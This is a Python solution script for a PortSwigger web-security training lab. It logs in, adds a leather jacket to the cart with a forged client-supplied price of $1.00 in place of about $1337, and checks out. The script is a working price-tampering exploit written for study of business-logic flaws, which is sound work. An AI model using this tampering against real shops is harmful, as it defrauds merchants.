# Lab 01 — Excessive trust in client-side controls
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
#
# Vulnerability: Product price is submitted from the client as a POST
#                parameter — the server trusts it without recalculating
# Aim:           Buy the "Lightweight l33t leather jacket" for less than
#                its real price
#
# Technique:
#   The /cart POST includes a price= field (in cents). Simply override it
#   to a small value before sending — the server stores whatever price the
#   client claims rather than looking it up from its own product data.
#
# Usage: python business_logic_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   find_product_id, add_to_cart, get_cart_total,
                                   check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAKE_PRICE_CENTS = "100"  # $1.00 instead of the real ~$1337.00

if __name__ == "__main__":
    banner()
    section("LAB 01 — EXCESSIVE TRUST IN CLIENT-SIDE CONTROLS")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    print("\n  ── Step 1: locate the leather jacket product\n")
    product_id = find_product_id(session, url)

    print(f"\n  ── Step 2: add to cart with a forged price={FAKE_PRICE_CENTS}\n")
    r = add_to_cart(session, url, product_id, quantity=1,
                     extra_data={"price": FAKE_PRICE_CENTS})
    check_status(r, [200, 302], "Add to cart with forged price")

    total = get_cart_total(session, url)
    if total:
        print_box("Cart total (should reflect the forged price)", f"${total}")

    print("\n  ── Step 3: place the order\n")
    r_checkout = session.post(f"{url}/cart/checkout")
    check_status(r_checkout, [200, 302], "Checkout")

    print()
    print("  ℹ  The server never recalculated the price from its own product")
    print("     database — it trusted the client-supplied 'price' field")
    print("     completely. Client-side display and JS validation never")
    print("     touch the raw HTTP request that actually reaches the server.")
